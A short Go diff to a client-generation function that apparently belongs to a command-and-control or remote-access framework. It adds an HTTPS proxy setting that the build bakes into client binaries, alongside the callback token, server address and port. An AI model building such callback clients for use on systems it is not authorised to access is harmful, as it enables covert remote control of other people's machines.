@@ -301,7 +301,8 @@ func (s *GServer) GenerateClient(
 	serverPort uint16,
 	clientID string,
 	binType string,
-	arch string) (string, error) {
+	arch string,
+	proxyServer string) (string, error) {
 
 	if clientID == "" {
 		clientID = common.GenerateString(8)
@@ -338,7 +339,7 @@ func (s *GServer) GenerateClient(
 		log.Printf("[!] Invalid platform specified")
 	}*/
 
-	flagString := fmt.Sprintf("-s -w -X main.clientToken=%s -X main.serverAddress=%s -X main.serverPort=%d", token, serverAddress, serverPort)
+	flagString := fmt.Sprintf("-s -w -X main.clientToken=%s -X main.serverAddress=%s -X main.serverPort=%d -X main.httpsProxyServer=%s", token, serverAddress, serverPort, proxyServer)
 	var commands []string
 
 	commands = append(commands, "build")
